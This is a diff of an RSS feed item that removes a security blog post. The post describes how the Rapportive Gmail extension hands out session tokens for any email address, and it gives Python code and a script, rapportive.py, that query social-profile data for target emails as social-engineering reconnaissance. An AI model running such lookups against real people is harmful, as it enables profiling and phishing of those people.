-&lt;p&gt;Let&amp;rsquo;s take a look at how the Rapportive Extension works (disclosure: I&amp;rsquo;m using Chrome). The extension simply consists of a Javascript file called &amp;ldquo;user.js&amp;rdquo;. When we navigate to Gmail, this file will load another JS file called &lt;a href=&#34;https://rapportive.com/load/launchpad&#34;&gt;&amp;ldquo;launchpad&amp;rdquo;&lt;/a&gt;. The launchpad file then fetches the main file called &lt;a href=&#34;https://rapportive.com/load/application&#34;&gt;&amp;ldquo;application&amp;rdquo;&lt;/a&gt;, which implements all the functionality provided by Rapportive. If you want to do a full static analysis of them - feel free. For this post, we&amp;rsquo;ll take a look at the behavior of the extension, and see if we can automate its functionality.&lt;/p&gt;
-
-&lt;p&gt;Here are the requests made when using the extension:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/rapportive/burp.png&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/rapportive/burp.png&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;There are two interesting requests to note. The first one is a call to /immediate_login. This is used to login to Rapportive using Google&amp;rsquo;s &lt;a href=&#34;https://developers.google.com/accounts/docs/OpenID&#34;&gt;OpenID&lt;/a&gt;. The next request to note is to /contacts/email?[target_email]. This is the call made when we open an email from one of our contacts. Here is an example of the data returned (I&amp;rsquo;ve only removed unneccessary data for brevity):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
-   &amp;quot;contact&amp;quot;:{
-      &amp;quot;image_url_raw&amp;quot;:&amp;quot;https:\/\/secure.gravatar.com\/avatar\/97754d23d40bbe7dce50f3424991b697?s=80&amp;amp;d=404&amp;quot;,
-      &amp;quot;raplets&amp;quot;:[],
-      &amp;quot;memberships&amp;quot;:[
-         {
-            &amp;quot;profile_url&amp;quot;:&amp;quot;http:\/\/www.linkedin.com\/pub\/54\/795\/752&amp;quot;,
-            &amp;quot;view_text&amp;quot;:&amp;quot;&amp;quot;,
-            &amp;quot;site_name&amp;quot;:&amp;quot;LinkedIn&amp;quot;,
-         },
-         {
-            &amp;quot;display_name&amp;quot;:&amp;quot;Blogger&amp;quot;,
-            &amp;quot;username&amp;quot;:null,
-            &amp;quot;profile_url&amp;quot;:&amp;quot;http:\/\/raidersec.blogspot.com&amp;quot;,
-            &amp;quot;view_text&amp;quot;:&amp;quot;View Jordan&#39;s profile on Blogger&amp;quot;,
-            &amp;quot;site_name&amp;quot;:&amp;quot;Blogger&amp;quot;,
-         },
-         {
-            &amp;quot;display_name&amp;quot;:&amp;quot;GitHub&amp;quot;,
-            &amp;quot;username&amp;quot;:&amp;quot;jordan-wright&amp;quot;,
-            &amp;quot;profile_id&amp;quot;:&amp;quot;jordan-wright&amp;quot;,
-            &amp;quot;profile_url&amp;quot;:&amp;quot;https:\/\/github.com\/jordan-wright&amp;quot;,
-            &amp;quot;view_text&amp;quot;:&amp;quot;View Jordan&#39;s profile on GitHub&amp;quot;,
-            &amp;quot;site_name&amp;quot;:&amp;quot;GitHub&amp;quot;,
-         }
-      ],
-      &amp;quot;headline&amp;quot;:&amp;quot;Jordan Wright - Security Engineer&amp;quot;,
-      &amp;quot;email&amp;quot;:&amp;quot;jmwright798@gmail.com&amp;quot;,
-      &amp;quot;location&amp;quot;:&amp;quot;Texas Area&amp;quot;,
-      &amp;quot;occupations&amp;quot;:[
-         {
-            &amp;quot;job_title&amp;quot;:&amp;quot;Security Engineer&amp;quot;
-         }
-      ],
-      &amp;quot;name&amp;quot;:&amp;quot;Jordan Wright&amp;quot;,
-   },
-   &amp;quot;success&amp;quot;:&amp;quot;image_or_occupation_or_useful_membership&amp;quot;,
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We can see that quite a bit of data was returned by this query. As social engineers, not only would we know that this is likely a valid email address (and therefore a valid email address format for other potential targets of the same organization), but we could also see the social networking profiles linked to this email address. This could reveal other infrmation which may be useful to us later.&lt;/p&gt;
-
-&lt;p&gt;So now we want to see how we can:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Automate the login process (&lt;em&gt;if needed&lt;/em&gt;)&lt;/li&gt;
-&lt;li&gt;Deconstruct the /contact/email query to find any special parameters that we need to pass&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Let&amp;rsquo;s start by taking a look at the parameters passed to the /contact/email request, and see what kind of information is needed:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/rapportive/contact_email_headers.png&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/rapportive/contact_email_headers.png&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;We can immediately see an interesting header being sent with the request titled &amp;ldquo;X-Session-Token&amp;rdquo;. It turns out that &lt;strong&gt;the entire authentication of the request relies on sending this token&lt;/strong&gt;. We can test this using an API console like &lt;a href=&#34;https://apigee.com/console/others&#34;&gt;this one&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Now we just need to figure out where to get our session token. There was one request that Burp didn&amp;rsquo;t catch that is made once we first log into Gmail. It is a request to /login_status?[email_address]. The response to this query looks like this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;{
-   &amp;quot;user_full_name&amp;quot;:&amp;quot; &amp;quot;,
-   &amp;quot;status&amp;quot;:200,
-   &amp;quot;authenticated_as&amp;quot;:null,
-   &amp;quot;active_auths&amp;quot;:[],
-   &amp;quot;claimed_emails&amp;quot;:null,
-   &amp;quot;plan&amp;quot;:{
-      &amp;quot;key&amp;quot;:&amp;quot;free&amp;quot;,
-      &amp;quot;price&amp;quot;:0,
-      &amp;quot;name&amp;quot;:&amp;quot;Free&amp;quot;
-   },
-   &amp;quot;session_token&amp;quot;:&amp;quot;BAgiX09ON0&amp;amp;lt;snip&amp;amp;lt;ece684be8&amp;quot;,
-   &amp;quot;user_preferences&amp;quot;:{&amp;amp;lt;snip&amp;amp;lt;},
-   &amp;quot;authenticity_token&amp;quot;:&amp;quot;7KNIosqb&amp;amp;lt;snip&amp;amp;gt;csaXzbQFOFi7jg=&amp;quot;,
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This request will return a session token for the currently logged in user. However, here&amp;rsquo;s the trick: &lt;strong&gt;&lt;em&gt;any email will work&lt;/em&gt;&lt;/strong&gt;. Seriously - &lt;a href=&#34;http://rapportive.com/login_status?user_email=this_doesnt_exist_@gmail.com&#34;&gt;try it&lt;/a&gt;. Even without being logged in to Rapportive (ie, by using a random email address), we can still receive a session token and can still make valid queries on email addresses like the one seen originally. So - we don&amp;rsquo;t need to worry about automating the authentication.&lt;/p&gt;
-
-&lt;p&gt;Let&amp;rsquo;s take a look at how we can at least automate the process of getting the session token and querying for an email address.&lt;/p&gt;
-
-&lt;h3 id=&#34;automating-rapportive-queries&#34;&gt;Automating Rapportive Queries&lt;/h3&gt;
-
-&lt;p&gt;Now that we know how Rapportive works, we can automate the process to perform lookups for users of our choosing. Let&amp;rsquo;s start by getting the session token for a particular email address:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;import requests
-random_email = &#39;asdfqwer@gmail.com&#39;
-response = requests.get(&#39;https://rapportive.com/login_status?user_email=&#39; + random_email).json()
-print response[&#39;session_token&#39;]
-# output - BAgiX0IvUmJHMUQ3Z2pOUWhmM0ZKRX...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Easy as that! Now that we have the session token, we can make a request for a given target email address as follows:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;profile = requests.get(&#39;https://profiles.rapportive.com/contacts/email/&#39; + target_email,
-            headers = {&#39;X-Session-Token&#39; : response[&#39;session_token&#39;]}).json()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The profile returned will now be in JSON format where we can parse out any information such as social networking profile links, usernames, etc. I won&amp;rsquo;t bore you with the implementation of all the parsing - so let&amp;rsquo;s move onto the final script!&lt;/p&gt;
-
-&lt;h3 id=&#34;introducing-rapportive-py&#34;&gt;Introducing rapportive.py&lt;/h3&gt;
-
-&lt;p&gt;I&amp;rsquo;ve created a simple Python script called &lt;a href=&#34;https://github.com/jordan-wright/rapportive&#34;&gt;rapportive.py&lt;/a&gt; to do this work for us. It takes in a list of email addresses from STDIN or a single email via the -e argument and prints out any results found. This can be useful if we want to pass in emails from other tools such as &lt;a href=&#34;https://github.com/pentestgeek/jigsaw/blob/master/jigsaw.rb&#34;&gt;jigsaw.rb&lt;/a&gt;. It can also log to an output file, if needed.&lt;/p&gt;
-
-&lt;p&gt;Here is an example of how to use it:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;~# cat emails.txt | ./rapportive.py
-10-25 23:37 rapportive   INFO     Using owcdf@gmail.com
-10-25 23:37 rapportive   INFO     Found match for jmwright798@gmail.com
-
-Name: Jordan Wright
-Position: Security  Engineer
-Company: CoNetrix
-        LinkedIn - http://www.linkedin.com/pub/54/795/752
-        Blogger - http://raidersec.blogspot.com
-        GitHub - https://github.com/jordan-wright
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;~# ./rapportive.py -e jmwright798@gmail.com
-10-25 23:31 rapportive   INFO     Using ntmai@gmail.com
-10-25 23:31 rapportive   INFO     Found match for jmwright798@gmail.com
-Name: Jordan Wright
-Position: Security  Engineer
-Company: CoNetrix
-        LinkedIn - http://www.linkedin.com/pub/54/795/752
-        Blogger - http://raidersec.blogspot.com
-        GitHub - https://github.com/jordan-wright
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;You can find it on &lt;a href=&#34;https://github.com/jordan-wright/rapportive&#34;&gt;Github&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Enjoy!&lt;/p&gt;
-
-&lt;p&gt;Jordan (&lt;a href=&#34;http://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;p&gt;&lt;/p&gt;</description>
     </item>
     
   </channel>
